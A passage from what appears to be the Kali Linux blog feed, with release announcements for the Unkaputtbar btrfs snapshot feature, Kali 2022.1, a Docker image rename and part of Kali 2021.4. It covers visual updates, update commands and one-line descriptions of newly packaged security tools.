<link>https://www.kali.org/blog/unkaputtbar/</link>
<guid isPermaLink="true">https://www.kali.org/blog/unkaputtbar/</guid>
<pubDate>Thu, 10 Mar 2022 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/unkaputtbar/images/banner-unkaputtbar.jpg" type="image/jpg"/>
<description><blockquote> <h5 id="adjective-german">Adjective (German)</h5> <p><strong><a href="https://en.wiktionary.org/wiki/unkaputtbar">unkaputtbar</a></strong> (comparative unkaputtbarer, superlative am unkaputtbarsten)</p> <p>From <em>un-</em> + <em>kaputt</em> + <em>-bar</em>.</p> <ol> <li>(colloquial) indestructible, unbreakable <em>Diese Flasche ist <strong>unkaputtbar</strong>.</em> ? This bottle is <strong>indestructible</strong>.</li> </ol> </blockquote> <p>With our <a href="https://www.kali.org/blog/kali-linux-2022-1-release/">2022.1 release</a>, we promised something big for you bare-metal installers and here it is. With no further ado, we present to you:</p> <h3 id="kali-unkaputtbar">Kali Unkaputtbar</h3> <p><em>Summary: <strong>Unkaputtbar brings Virtual Machines&rsquo; (VMs&rsquo;) snapshot feature to bare-metal and injects some steroids</strong>.</em></p> <p>Have you ever wished you could travel back in time after deleting that important customer report or after installing a broken driver <em>(Nvidia?)</em> just before heading into a board meeting? Well, you better read on, because now you can!</p> <p>From zero to hero in 30 seconds (You <em>really</em> want to enable video playback in your browser for this):</p> <video class="video-shortcode" preload="metadata" autoplay muted loop> <source src="https://www.kali.org/blog/unkaputtbar/videos/kali-unkaputtable-demo.mp4" > Your browser does not support the video tag. </video> <p>All it takes is installing Kali Linux version 2022.1 or newer with btrfs as the file system and to enable snapshotting after installation and you will get:</p> <ul> <li>automatic snapshots with APT installations or removals</li> <li>automatic snapshots on every boot</li> <li>automatically created Kali Linux specific btrfs subvolume layout</li> <li>new boot menu allowing you to boot into snapshots</li> <li>ability to browse the file content of snapshots and copy files across</li> <li>perform diffs between snapshots and restore individual files</li> </ul> <p>But don&rsquo;t take our word for it, see for yourself what <a href="https://www.kali.org/docs/installation/btrfs/">Kali Unkaputtbar</a> can do.</p> <hr> <h2 id="unkaputtbar-features">Unkaputtbar features</h2> <h4 id="boot-snapshot">Boot snapshot</h4> <p>Booting into snaphots from the GRUB boot menu:</p> <p><p> <a href='https://www.kali.org/blog/unkaputtbar/images/btrfs-50-rollback1.png'> <img src="https://www.kali.org/blog/unkaputtbar/images/btrfs-50-rollback1.png" alt="" /> </a> </p> </p> <h4 id="diff-snapshots">Diff snapshots</h4> <p>Using snapper to generate diffs between snapshots:</p> <p><p> <a href='https://www.kali.org/blog/unkaputtbar/images/btrfs-60-diff1.png'> <img src="https://www.kali.org/blog/unkaputtbar/images/btrfs-60-diff1.png" alt="" /> </a> </p> </p> <h4 id="browse-snapshots">Browse snapshots</h4> <p>You can even browse the content of snapshots:</p> <p><p> <a href='https://www.kali.org/blog/unkaputtbar/images/btrfs-70-browse1.png'> <img src="https://www.kali.org/blog/unkaputtbar/images/btrfs-70-browse1.png" alt="" /> </a> </p> </p> <h4 id="additional-automatic-snapshots">Additional automatic snapshots</h4> <p>Configuring additional automatic snapshots such as of your home drive takes mere seconds:</p> <p><p> <a href='https://www.kali.org/blog/unkaputtbar/images/btrfs-030-snapper-config2.png'> <img src="https://www.kali.org/blog/unkaputtbar/images/btrfs-030-snapper-config2.png" alt="" /> </a> </p> </p> <hr> <h2 id="install-unkaputtbar">Install Unkaputtbar</h2> <p>Can&rsquo;t wait to get your hands on it? Well don&rsquo;t ;-)</p> <p>Download our latest image from <a href="https://www.kali.org/get-kali/#kali-installer-images">here</a> and enable automatic snapshots as described in our <a href="https://www.kali.org/docs/installation/btrfs/">dedicated documentation</a>. That page also contains all the essential information to take full advantage of Kali Unkaputtbar.</p> <hr> <p><strong>Special Thanks</strong>:</p> <p>Kali Unkaputtbar is made possible by software from an incredible bunch of people and we would like to express our heartfelt thanks to <a href="https://github.com/Antynea">Antynea</a>, <a href="https://github.com/ricardomv">Ricardo Vieira</a>, and our friends at <a href="https://www.opensuse.org/">openSUSE</a> for their tireless work on <a href="https://pkg.kali.org/pkg/grub-btrfs">grub-btrfs</a>, <a href="https://pkg.kali.org/pkg/snapper-gui">snapper-gui</a>, &amp; <a href="https://pkg.kali.org/pkg/snapper">snapper</a> respectively.</p></description>
</item>
<item>
<title>Kali Linux 2022.1 Release (Visual Updates, Kali Everything ISOs, Legacy SSH)</title>
<link>https://www.kali.org/blog/kali-linux-2022-1-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2022-1-release/</guid>
<pubDate>Mon, 14 Feb 2022 00:00:00 +0000</pubDate>
<enclosure url="https://www.kali.org/blog/kali-linux-2022-1-release/images/banner-2022.1-release.jpg" type="image/jpg"/>
<description><p>Today we are pushing out the first Kali Linux <a href="https://www.kali.org/releases/">release</a> of the new year with <strong>Kali Linux 2022.1</strong>, and just in time for Valentine&rsquo;s Day! This release brings various visual updates and tweaks to existing features, and is ready to be <a href="https://www.kali.org/get-kali/">downloaded</a> or <a href="https://www.kali.org/docs/general-use/updating-kali/">upgraded <em>if you have an existing Kali Linux installation</em></a>.</p> <p>The summary of the <a href="https://bugs.kali.org/changelog_page.php">changelog</a> since the <a href="https://www.kali.org/blog/kali-linux-2021-4-release/">2021.4 release from December 2021</a> is:</p> <ul> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-1-release/#visual-refresh-theme-updates">Visual Refresh</a></strong> - Updated wallpapers and GRUB theme</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-1-release/#shell-prompt-changes">Shell Prompt Changes</a></strong> - Visual improvements to improve readability when copying code</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-1-release/#refreshed-browser-landing-page">Refreshed Browser Landing Page</a></strong> - Firefox and Chromium homepage has had a makeover to help you access everything Kali you need</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-1-release/#kali-everything-image-everything-in-one-place">Kali Everything Image</a></strong> - An all-packages-in-one solution now available to download</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-1-release/#kali-tweaks-legacy-ssh-made-easy">Kali-Tweaks Meets SSH</a></strong> - Connect to old SSH servers using legacy SSH protocols and ciphers</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-1-release/#vmware-i3-improvements">VMware i3 Improvements</a></strong> - Host-guest features properly work now on i3</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-1-release/#accessibility-talk-to-me">Accessibility Features</a></strong> - Speech synthesis is back in the Kali installer</li> <li><strong><a href="https://www.kali.org/blog/kali-linux-2022-1-release/#new-tools-in-kali">New Tools</a></strong> - Various new tools added, many from ProjectDiscovery!</li> </ul> <p><em>Besides that, we have been working on a new feature, which just isn&rsquo;t quite ready yet (as the <a href="https://www.kali.org/docs/">documentation</a> is still in progress!). It&rsquo;s a large one, so it&rsquo;s going to have its own blog post once ready to help demonstrate its importance to us. This one is for you bare-metal installers!</em></p> <p><em>Edit: <a href="https://www.kali.org/blog/unkaputtbar/">Now out</a>!</em></p> <hr> <h2 id="visual-refresh-theme-updates">Visual Refresh: Theme Updates</h2> <p>As promised back in <a href="https://www.kali.org/blog/kali-linux-2021-2-release/">Kali 2021.2</a>, beginning with this release (2022.1) going forwards, our yearly 20xx.1 versions will be the only releases to have the main visual updates. Using a yearly lifecycle, it makes it easier to recognize the different versions of Kali Linux over time. This update includes <strong>new wallpapers</strong> for desktop, <strong>login</strong>, and <strong>boot displays</strong>, in addition to a <strong>refreshed installer theme</strong> <em>which you may have seen if you have recently <a href="https://www.kali.org/docs/general-use/updating-kali/">updated</a>.</em></p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-1-release/images/desktop-wallpaper.png'> <img src="https://www.kali.org/blog/kali-linux-2022-1-release/images/desktop-wallpaper.png" alt="" /> </a> </p> </p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-1-release/images/login-wallpaper.png'> <img src="https://www.kali.org/blog/kali-linux-2022-1-release/images/login-wallpaper.png" alt="" /> </a> </p> </p> <p>Moreover, the functions, theme and layout of the boot menu present in our ISO images have been improved. With these changes, it makes them consistent throughout. Previously, the menus in the <strong>UEFI</strong> and the <strong>BIOS boot menus</strong> had different options, designs, and were also written differently, making them confusing. Throw into the mix that there were multiple differences between &ldquo;installer&rdquo;, &ldquo;live&rdquo;, &ldquo;netinstall&rdquo; and &ldquo;mini&rdquo; options as well. All of these problems have been addressed and they now have a <strong>universal feel</strong> to them all.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-1-release/images/boot-theme.png'> <img src="https://www.kali.org/blog/kali-linux-2022-1-release/images/boot-theme.png" alt="" /> </a> </p> </p> <h2 id="shell-prompt-changes">Shell Prompt Changes</h2> <p>You talked, we listened. We have made a few tweaks which we hope will make your life easier since our last prompt update in <a href="https://www.kali.org/blog/kali-linux-2020-4-release/">2020.4</a>. Examples of this problem may be when writing a professional pentesting report or collaborating on debugging code and sharing the terminal, the <strong>right-side prompt</strong> <em>(which had the exit code and the number of background processes)</em> may of gotten in the way. So it has been <strong>removed from our default shell</strong>, ZSH. Along with this, <strong>the skull in the root prompt has been replaced</strong> with a simple <code>?</code>. For those that miss the root skull (??), you can easily edit your <code>~/.zshrc</code>:</p> <pre><code class="language-console">+--(root?kali)-[~] +-# sed -i 's/prompt_symbol=?/prompt_symbol=??/' ~/.zshrc +--(root?kali)-[~] +-# source ~/.zshrc +--(root??kali)-[~] +-# </code></pre> <p>If you do a fresh install of Kali 2022.1, you will have these changes. If you are upgrading, you will need to manually apply these edits by doing the following:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ cp -i /etc/skel/.{bash,zsh}rc ~/ </code></pre> <h2 id="refreshed-browser-landing-page">Refreshed Browser Landing Page</h2> <p>This release comes with a fresh new look for the <strong>default landing page</strong> shipped inside Kali. Utilizing the refreshed documentation sites <em>(<a href="https://www.kali.org/docs/">Kali-Docs</a> and <a href="https://www.kali.org/tools/">Kali-Tools</a>)</em>, the search function will help you find almost anything you could need using Kali Linux!</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-1-release/images/firefox-home-page.png'> <img src="https://www.kali.org/blog/kali-linux-2022-1-release/images/firefox-home-page.png" alt="" /> </a> </p> </p> <h2 id="kali-everything-image-everything-in-one-place">Kali Everything Image: Everything in one place</h2> <p>This release will welcome a <strong>new flavor</strong>, the &ldquo;kali-linux-everything&rdquo; image. This allows for <strong>a complete offline standalone image</strong> (ISO), for those who require <strong>all of Kali&rsquo;s tools to be pre-installed</strong>. Unlike <a href="https://www.kali.org/blog/kali-linux-2020-2-release/">previously</a>, users will not be required to download the &ldquo;kali-linux-everything&rdquo; packages during Kali&rsquo;s setup via a network mirror, as they will be located on the same media, but the image is much larger to initially download due to this. Because of the size increase, (~2.8GB to ~9.4GB), these images will be only initially offered using a technology that its designed to handle the traffic, BitTorrent. Additionally, as there are more packages, it will take longer to also install Kali.</p> <p>If you understand what you are doing, and this sounds like something you would like, <a href="https://www.kali.org/get-kali/">grab the torrents</a> and give it a try!</p> <p>To learn more about the grouping of Kali&rsquo;s packages, please see our documentation about <a href="https://www.kali.org/docs/general-use/metapackages/">metapackages</a>.</p> <p><em>This will not include <a href="https://www.kali.org/blog/introducing-kaboxer/">Kaboxer</a> applications at this point in time, due to a known limitation.</em></p> <h2 id="kali-tweaks-legacy-ssh-made-easy">Kali-Tweaks: Legacy SSH Made Easy</h2> <p>There is a new setting in the <code>kali-tweaks</code> <em>Hardening</em> section! It is now possible to configure Kali&rsquo;s SSH client for <em>Wide Compatibility</em>, which means that <strong>old algorithms and ciphers are enabled</strong>. Thanks to that, connecting to old servers that use those is now straightforward, no need to pass additional options explicitly on the command-line.</p> <p>The purpose of this setting is to make it easier to discover vulnerable SSH servers, just like <a href="https://www.kali.org/blog/kali-linux-2021-3-release/">explained previously</a> this opens up more potential attack surfaces <em>(which is how this came about, due to a recent pentest, a Uninterruptible Power Supply gave us our foothold to complete network pwnage)</em>.</p> <div class="notices info"> <p data-header="Info"> Please note, unlike <a href="https://www.kali.org/blog/kali-linux-2021-3-release/">OpenSSL</a> and <a href="https://www.kali.org/blog/kali-linux-2021-4-release/">Samba</a>, this weakened behaviour is <em>NOT</em> enabled by default, as SSH is a sensitive enough component that we prefer to keep it <strong><em>Secure</em> by default</strong>. Therefore if you are interested in this setting, you will have to run <code>kali-tweaks</code>, enter the <em>Hardening</em> section and enable it in there. </p> </div> <p>Here is what the <em>Hardening</em> screen looks like currently:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2022-1-release/images/kali-tweaks-hardening.png'> <img src="https://www.kali.org/blog/kali-linux-2022-1-release/images/kali-tweaks-hardening.png" alt="" /> </a> </p> </p> <h2 id="vmware-i3-improvements">VMware i3 Improvements</h2> <p>For users that use Kali in a guest VM with the i3 desktop environment (<code>kali-desktop-i3</code>), VMware&rsquo;s host-guest features (e.g. drag &rsquo;n&rsquo; drop, copy/paste) were not enabled by default, it had to be done manually. This is now fixed and you should not have anything to do, it should work out of the box. This was enabled with package <a href="https://pkg.kali.org/pkg/i3-wm">i3-wm</a> <code>4.20.1-1</code>.</p> <h2 id="accessibility-talk-to-me">Accessibility: Talk To Me</h2> <p>We have always tried to support as many users of Kali as possible. This is true from our <a href="https://www.kali.org/blog/kali-linux-1-0-3-release/">early releases</a> through to today.</p> <p>To help blind and visually impaired users, we are pleased to say <strong>speech synthesis</strong> is back in the Kali setup. When we released <a href="https://www.kali.org/blog/kali-linux-2021-4-release/">Kali 2021.4</a>, the sound in the installer broke. This was due to a packaging bug in the sound driver, and unfortunately this issue went unnoticed for a while. This is now fixed. Big thanks to isfr8585 who reported the <a href="https://bugs.kali.org/view.php?id=7467">issue</a>!</p> <h2 id="new-tools-in-kali">New Tools in Kali</h2> <p>Between numerous packages updates, there has been various new tools added! A quick breakdown of what has been added <em>(to the network repositories)</em>:</p> <ul> <li><a href="https://pkg.kali.org/pkg/dnsx">dnsx</a> - Fast and multi-purpose DNS toolkit allow to run multiple DNS queries</li> <li><a href="https://pkg.kali.org/pkg/email2phonenumber">email2phonenumber</a> - An OSINT tool to obtain a target&rsquo;s phone number just by having his email address</li> <li><a href="https://pkg.kali.org/pkg/naabu">naabu</a> - A fast port scanner with a focus on reliability and simplicity</li> <li><a href="https://pkg.kali.org/pkg/nuclei">nuclei</a> - Targeted scanning based on templates</li> <li><a href="https://pkg.kali.org/pkg/poshc2">PoshC2</a> - A proxy aware C2 framework with post-exploitation and lateral movement</li> <li><a href="https://pkg.kali.org/pkg/proxify">proxify</a> - Swiss Army knife Proxy tool for HTTP/HTTPS traffic capture, manipulation, and replay on the go</li> </ul> <p><em>Shout-out to <a href="https://projectdiscovery.io/">ProjectDiscovery</a> for their work &amp; tools!</em></p> <h2 id="kali-arm-updates">Kali ARM Updates</h2> <p>A list of packages that were previously not available for the <code>arm64</code> architecture, and that have been added in this release:</p> <ul> <li><a href="https://pkg.kali.org/pkg/feroxbuster">feroxbuster</a></li> <li><a href="https://pkg.kali.org/pkg/ghidra">ghidra</a></li> </ul> <p>Bluetooth should now be fixed on the RaspberryPi images, aside from the Zero 2 W, which we are still hunting down a fix for and will release an updated image when it is ready. There was a change with the bootloader that changed the serial device name being used.</p> <p>Image file names have changed to be a bit more verbose with their naming, instead of using short-hand or nicknames of devices.</p> <p>The build scripts now have a <a href="https://www.kali.org/docs/development/arm-build-scripts/">documentation page</a> that explains them a bit more in depth.</p> <p>The RaspberryPi Zero 2 W device has documentation now as well.</p> <hr> <h2 id="community-shout-outs">Community Shout-Outs</h2> <p>These are <strong>people from the public who have helped Kali</strong> and the team for the last release. And we want to praise them for their work <em>(we like to give credit where due!)</em>:</p> <ul> <li><a href="https://twitter.com/laiuydfoiu">Greg Myers</a> who helped to clean up our kali-docs</li> <li><a href="https://gitlab.com/voidyourwarranty">Void Your Warranty</a> who contributed a very helpful <a href="https://www.kali.org/docs/usb/usb-standalone-encrypted/">encrypted standalone USB</a> kali-docs page</li> <li><a href="https://gitlab.com/cyrus104">D</a> for his contributions on the Gatworks Ventana and Gateworks Newport Kali ARM build-scripts</li> <li><a href="https://gitlab.com/1y">1y</a> for contributing the i.MX6ULL EVK Kali ARM build-script, which we accidentally dropped during the refactoring. It has now been restored.</li> </ul> <p>Anyone can help out, anyone can get <a href="https://www.kali.org/docs/community/contribute/">involved</a>!</p> <hr> <h2 id="download-kali-linux-20221">Download Kali Linux 2022.1</h2> <p><strong>Fresh Images</strong>: So what are you waiting for? Start <a href="https://www.kali.org/get-kali/">downloading</a> already!</p> <p>Seasoned Kali Linux users are already aware of this, but for the ones who are not, we do also produce <strong><a href="https://cdimage.kali.org/kali-images/kali-weekly/">weekly builds</a></strong> that you can use as well. If you cannot wait for our next release and you want the latest packages <em>(or bug fixes)</em> when you download the image, you can just use the weekly image instead. This way you will have fewer updates to do. <em>Just know that these are automated builds that we do not QA like we do our standard <a href="https://www.kali.org/releases/">release images</a></em>. But we gladly take <a href="https://bugs.kali.org/">bug reports</a> about those images because we want any issues to be fixed before our next release!</p> <p><strong>Existing Installs</strong>: If you already have an existing Kali Linux installation, remember you can always do a quick <a href="https://www.kali.org/docs/general-use/updating-kali/">update</a>:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; | sudo tee /etc/apt/sources.list +--(kali?kali)-[~] +-$ sudo apt update &amp;&amp; sudo apt -y full-upgrade +--(kali?kali)-[~] +-$ cp -rbi /etc/skel/. ~ +--(kali?kali)-[~] +-$ [ -f /var/run/reboot-required ] &amp;&amp; sudo reboot -f </code></pre> <p>You should now be on Kali Linux 2022.1. We can do a quick check by doing:</p> <pre><code class="language-console">+--(kali?kali)-[~] +-$ grep VERSION /etc/os-release VERSION=&quot;2022.1&quot; VERSION_ID=&quot;2022.1&quot; VERSION_CODENAME=&quot;kali-rolling&quot; +--(kali?kali)-[~] +-$ uname -v #1 SMP Debian 5.15.15-2kali1 (2022-01-31) +--(kali?kali)-[~] +-$ uname -r 5.15.0-kali3-amd64 </code></pre> <p><em>NOTE: The output of <code>uname -r</code> may be different depending on the system <a href="https://pkg.kali.org/pkg/linux">architecture</a>.</em></p> <p>As always, should you come across any bugs in Kali, please submit a report on our <a href="https://bugs.kali.org/">bug tracker</a>. <em>We will never be able to fix what we do not know is broken!</em> <strong>And <a href="https://twitter.com/kalilinux">Twitter</a> is not a Bug Tracker!</strong></p> <p>Want to keep in up-to-date easier? We have a <a href="https://www.kali.org/rss.xml">RSS feeds</a> &amp; <a href="https://www.kali.org/newsletter/">newsletter</a> of our <a href="https://www.kali.org/blog/">blog</a>!</p></description>
</item>
<item>
<title>Kali's stable Docker image is now named kali-last-release</title>
<link>https://www.kali.org/blog/renaming-kali-stable-docker-image/</link>
<guid isPermaLink="true">https://www.kali.org/blog/renaming-kali-stable-docker-image/</guid>
<pubDate>Wed, 12 Jan 2022 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/renaming-kali-stable-docker-image/images/banner.jpg" type="image/jpg"/>
<description><p>Here is a very quick announcement for users of the <a href="https://www.kali.org/docs/containers/official-kalilinux-docker-images/">Kali Linux Docker Images</a>.</p> <p>Until recently we used to have a Docker image named simply <code>kali</code>, and it was built from the last <a href="https://www.kali.org/releases/">versioned release</a> of Kali (e.g. 2019.4, 2020.1, etc.) matching our <a href="https://www.kali.org/docs/general-use/kali-branches/">&ldquo;kali-last-snapshot&rdquo; network repositories branch</a>. In a way, this is our &ldquo;stable&rdquo; release, as it will only get updates quarterly as it is in synchronisation with our release cycle.</p> <p>We still provide this <strong>Docker image</strong>, but now it has been <strong>renamed from <code>kali</code> to <a href="https://hub.docker.com/r/kalilinux/kali-last-release"><code>kali-last-release</code></a></strong> for clarity.</p> <p>The old <code>kali</code> Docker image is still around for the time being, but if you use it you will see a deprecation warning to indicate that it is in the <strong>process of being phased out</strong>. The rest of the deprecation plan is as follow:</p> <ul> <li>Upon Kali <code>2022.1</code> release, we will update the image to make it fail, meaning that the container will error out with a helpful message when you try to run it.</li> <li>Upon Kali <code>2022.2</code> release, we will completely remove it from <a href="https://hub.docker.com/r/kalilinux/">our Docker Hub</a>.</li> </ul> <p>So if you still use this image in your scripts or Dockerfiles, <strong>please update</strong> those and use <code>kali-last-release</code> instead.</p> <p>An additional reminder: if you are after the <strong>most up-to-date version of Kali, you probably want to use the <a href="https://hub.docker.com/r/kalilinux/kali-last-release">kali-rolling</a> Docker image</strong>. This is the &ldquo;main&rdquo; image <em>(which matches our other platforms)</em>, and it is updated every week <em>(the network packages get updated daily also like all other Kali platforms)</em>.</p> <p>For lots more details, please refer to our <a href="https://www.kali.org/docs/containers/official-kalilinux-docker-images/">official Kali Docker documentation</a>.</p> <p>Thank you and happy 11111100110!</p> <p>PS &ndash; On a related topic: the Kali images were recently added to the <a href="https://github.com/containers/shortnames">containers shortnames list</a>. It means that <strong>Podman users</strong> can run a Kali container simply by typing <code>podman run -it kali-rolling</code>, rather than using the full image name <code>docker.io/kalilinux/kali-rolling</code>. This works if the host system provides a very up-to-date shortnames list in <code>/etc/containers/registries.conf.d/shortnames.conf</code>. <em>If your host system is Kali Rolling, that&rsquo;s already the case!</em></p></description>
</item>
<item>
<title>Kali Linux 2021.4 Release</title>
<link>https://www.kali.org/blog/kali-linux-2021-4-release/</link>
<guid isPermaLink="true">https://www.kali.org/blog/kali-linux-2021-4-release/</guid>
<pubDate>Thu, 09 Dec 2021 00:00:00 +0000</pubDate>
<updated>Mon, 17 Jan 2022 00:00:00 +0000)</updated>
<enclosure url="https://www.kali.org/blog/kali-linux-2021-4-release/images/banner-2021.4-release.jpg" type="image/jpg"/>
<description><p>With the end of 2021 just around the corner, we are pushing out the last <a href="https://www.kali.org/releases/">release</a> of the year with <strong>Kali Linux 2021.4</strong>, which is ready for immediate <a href="https://www.kali.org/get-kali/">download</a> or <a href="https://www.kali.org/docs/general-use/updating-kali/">updating</a>.</p> <p>The summary of the <a href="https://bugs.kali.org/changelog_page.php">changelog</a> since the <a href="https://www.kali.org/blog/kali-linux-2021-3-release/">2021.3 release from September 2021</a> is:</p> <ul> <li><a href="https://www.kali.org/blog/kali-linux-2021-4-release/#kali-on-the-apple-m1">Improved Apple M1 support</a></li> <li><a href="https://www.kali.org/blog/kali-linux-2021-4-release/#extended-compatibility-for-the-samba-client">Wide compatibility for Samba</a></li> <li><a href="https://www.kali.org/blog/kali-linux-2021-4-release/#easy-package-manager-mirror-configuration">Switching package manager mirrors</a></li> <li><a href="https://www.kali.org/blog/kali-linux-2021-4-release/#kaboxer-theme-support">Kaboxer theming</a></li> <li><a href="https://www.kali.org/blog/kali-linux-2021-4-release/#desktop--theme-enhancement">Updates to Xfce, GNOME and KDE</a></li> <li><a href="https://www.kali.org/blog/kali-linux-2021-4-release/#kali-arm-updates">Raspberry Pi Zero 2 W + USBArmory MkII ARM images</a></li> <li><a href="https://www.kali.org/blog/kali-linux-2021-4-release/#new-tools-in-kali">More tools</a></li> </ul> <hr> <h2 id="kali-on-the-apple-m1">Kali on the Apple M1</h2> <p>As we announced in <a href="https://www.kali.org/blog/kali-linux-2021-1-release/">Kali 2021.1</a> we supported installing Kali Linux on Parallels on Apple Silicon Macs, well with 2021.4, we now also support it on the <a href="https://blogs.vmware.com/teamfusion/2021/09/fusion-for-m1-public-tech-preview-now-available.html">VMware Fusion Public Tech Preview</a> thanks to the <a href="https://pkg.kali.org/pkg/linux">5.14 kernel</a> having the modules needed for the virtual GPU used. We also have updated the <code>open-vm-tools</code> <a href="https://pkg.kali.org/pkg/open-vm-tools">package</a>, and <a href="https://pkg.kali.org/pkg/debian-installer">Kali&rsquo;s installer</a> will automatically detect if you are installing under VMware and install the <code>open-vm-tools-desktop</code> package, which should allow you to change the resolution out of the box. As a reminder, this is still a <em>preview</em> from VMware, so there may be some rough edges. There is no extra <a href="https://www.kali.org/docs/virtualization/install-vmware-guest-vm/">documentation</a> for this because the <a href="https://www.kali.org/docs/installation/hard-disk-install/">installation process</a> is the same as VMWare on 64-bit and 32-bit Intel systems, just using the <a href="https://www.kali.org/get-kali/">arm64 ISO</a>.</p> <p>As a reminder, virtual machines on <strong>Apple Silicon are still limited to arm64 architecture only</strong>.</p> <h2 id="extended-compatibility-for-the-samba-client">Extended Compatibility for the Samba Client</h2> <p>Starting Kali Linux 2021.4, the <a href="https://pkg.kali.org/pkg/samba">Samba</a> client is now configured for <strong>Wide Compatibility</strong> so that it can connect to pretty much every Samba server out there, regardless of the version of the protocol in use. This change should make it easier to discover vulnerable Samba servers &ldquo;out of the box&rdquo;, without having to configure Kali.</p> <p>This setting can be changed easily via the command-line tool <code>kali-tweaks</code>. In the <em>Hardening</em> section, one can choose the value <strong>Default</strong> instead, which reverts back to Samba&rsquo;s usual default, and only allow using modern versions of the Samba protocol.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-4-release/images/kali-tweaks-hardening.png'> <img src="https://www.kali.org/blog/kali-linux-2021-4-release/images/kali-tweaks-hardening.png" alt="" /> </a> </p> </p> <p>As one can see on this screenshot, there&rsquo;s also a similar setting for <a href="https://pkg.kali.org/pkg/openssl">OpenSSL</a>. You might want to refer to the <a href="https://www.kali.org/blog/kali-linux-2021-3-release/">2021.3 release announcement</a> for more details on this setting.</p> <h2 id="easy-package-manager-mirror-configuration">Easy Package Manager Mirror Configuration</h2> <p>By default, when a Kali system is updated, the package manager (<a href="https://pkg.kali.org/pkg/apt">APT</a>) downloads packages from a <a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">community mirror</a> nearby. But did you know that it&rsquo;s also possible to configure Kali to get its package from the <a href="https://blog.cloudflare.com/cloudflare-repositories-ftw/">Cloudflare CDN</a>? To be honest, <a href="https://www.kali.org/blog/kali-linux-2019-3-release/">this is old news</a>. But what&rsquo;s new is that you can now use <code>kali-tweaks</code> to quickly configure whether APT should use community mirrors or the Cloudflare CDN.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-4-release/images/kali-tweaks-mirrors.png'> <img src="https://www.kali.org/blog/kali-linux-2021-4-release/images/kali-tweaks-mirrors.png" alt="" /> </a> </p> </p> <p>So which one is best, community mirrors or Cloudflare CDN? There&rsquo;s no good answer. The time that it actually takes to update Kali can vary greatly and depends on many factors, including the speed of your Internet connection, your location, and even the time of day, if ever you live in a place where Internet traffic jam occurs at rush hour. The point is: if ever Kali updates are slow, the best you can do is to try to switch from community mirrors to Cloudflare CDN, or the other way round, and find what works best for you. And with <code>kali-tweaks</code>, it&rsquo;s never been easier!</p> <h2 id="kaboxer-theme-support">Kaboxer Theme Support</h2> <p>With the latest update of <strong><a href="https://pkg.kali.org/pkg/kaboxer">Kaboxer</a></strong> tools no longer look out of place, as it brings <strong>support for window themes and icon themes</strong> (placed respectively inside <code>/usr/share/themes</code> and <code>/usr/share/icons</code>). This allows the program to properly integrate with the rest of the desktop and avoids the usage of ugly fallback themes.</p> <p>Here is a comparison of how zenmap (<strong>zenmap-kbx</strong> <a href="https://pkg.kali.org/pkg/zenmap-kbx">package</a>) looks with the default Kali Dark theme, compared to the old appearance:</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-4-release/images/kaboxer-theme-support.png'> <img src="https://www.kali.org/blog/kali-linux-2021-4-release/images/kaboxer-theme-support.png" alt="" /> </a> </p> </p> <h2 id="new-tools-in-kali">New Tools in Kali</h2> <p>It would not be a Kali release if there were not any new tools added! A quick run down of what&rsquo;s been added <em>(to the <a href="https://www.kali.org/docs/general-use/kali-linux-sources-list-repositories/">network repositories</a>)</em>:</p> <ul> <li><a href="https://pkg.kali.org/pkg/dufflebag">Dufflebag</a> - Search exposed EBS volumes for secrets</li> <li><a href="https://pkg.kali.org/pkg/maryam">Maryam</a> - Open-source Intelligence (OSINT) Framework</li> <li><a href="https://pkg.kali.org/pkg/name-that-hash">Name-That-Hash</a> - Do not know what type of hash it is? Name That Hash will name that hash type!</li> <li><a href="https://pkg.kali.org/pkg/proxmark3">Proxmark3</a> - if you are into Proxmark3 and RFID hacking</li> <li><a href="https://pkg.kali.org/pkg/rev-proxy-grapher">Reverse Proxy Grapher</a> - graphviz graph illustrating your reverse proxy flow</li> <li><a href="https://pkg.kali.org/pkg/s3scanner">S3Scanner</a> - Scan for open S3 buckets and dump the contents</li> <li><a href="https://pkg.kali.org/pkg/spraykatz">Spraykatz</a> - Credentials gathering tool automating remote procdump and parse of lsass process.</li> <li><a href="https://pkg.kali.org/pkg/trufflehog">truffleHog</a> - Searches through git repositories for high entropy strings and secrets, digging deep into commit history</li> <li><a href="https://pkg.kali.org/pkg/wotmate">Web of trust grapher (wotmate)</a> - reimplement the defunct PGP pathfinder without needing anything other than your own keyring</li> </ul> <h2 id="desktop--theme-enhancement">Desktop &amp; Theme Enhancement</h2> <p>This release brings updates for all the 3 main desktops (<a href="https://pkg.kali.org/pkg/xfce4">Xfce</a>, <a href="https://pkg.kali.org/pkg/gnome-shell">GNOME</a>, and <a href="https://pkg.kali.org/pkg/kde-plasma-desktop">KDE</a>), but one that is common to all of them is the <strong>new window buttons design</strong>. Previous buttons were designed to fit the window theme of Xfce but did not work well with the other desktops and lacked personality. The new design looks elegant on any of the desktops and makes it easier to spot the currently focused window.</p> <p><p> <a href='https://www.kali.org/blog/kali-linux-2021-4-release/images/new-window-buttons.png'> <img src="https://www.kali.org/blog/kali-linux-2021-4-release/images/new-window-buttons.png" alt="" /> </a> </p> </p> <h3 id="xfce">Xfce</h3> <p>The panel layout has been tweaked to optimize horizontal space and make room for 2 new widgets: the <strong>CPU usage widget</strong> and the <strong>VPN IP widget</strong>, which remains hidden unless a VPN connection is established.</p> 